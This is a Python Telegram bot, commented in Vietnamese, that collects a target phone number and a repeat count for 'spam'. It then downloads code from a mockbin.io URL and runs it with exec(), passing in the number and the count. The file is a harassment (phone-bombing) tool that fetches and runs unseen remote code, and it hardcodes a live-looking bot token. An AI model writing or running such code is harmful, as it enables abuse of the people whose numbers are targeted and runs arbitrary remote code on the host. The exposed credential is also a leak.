from telegram import Update
from telegram.ext import (
    ApplicationBuilder, CommandHandler, ContextTypes,
    ConversationHandler, MessageHandler, filters
)
import requests
import asyncio

BOT_TOKEN = '8374042933:AAGmPBOfr_EOxtwVJMdFqziQLAwTZy1I4-Q'  # Token bạn gửi

INPUT_PHONE, INPUT_COUNT = range(2)

user_data = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Nhập số điện thoại bạn muốn spam:")
    return INPUT_PHONE

async def input_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text
    user_data['phone'] = phone
    await update.message.reply_text(f"Số điện thoại: {phone}\nNhập số lần muốn spam:")
    return INPUT_COUNT

async def input_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    count_text = update.message.text
    if not count_text.isdigit():
        await update.message.reply_text("Vui lòng nhập số nguyên hợp lệ.")
        return INPUT_COUNT
    
    count = int(count_text)
    user_data['count'] = count

    await update.message.reply_text("Đang chạy spam, vui lòng chờ...")

    url = "https://e8dff6c0815f456f991e9fd08f626b99.api.mockbin.io/"
    try:
        response = requests.get(url)
        code = response.text
        
        exec_globals = {'phone': user_data['phone'], 'count': user_data['count'], 'asyncio': asyncio}
        exec(code, exec_globals)
        
        if 'main' in exec_globals:
            await exec_globals['main']()
        
        await update.message.reply_text("Spam đã chạy xong!")
    except Exception as e:
        await update.message.reply_text(f"Lỗi khi chạy spam: {e}")

    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Đã hủy thao tác.")
    return ConversationHandler.END

if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            INPUT_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, input_phone)],
            INPUT_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, input_count)],
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )

    app.add_handler(conv_handler)
    print("Bot đang chạy...")
    app.run_polling()
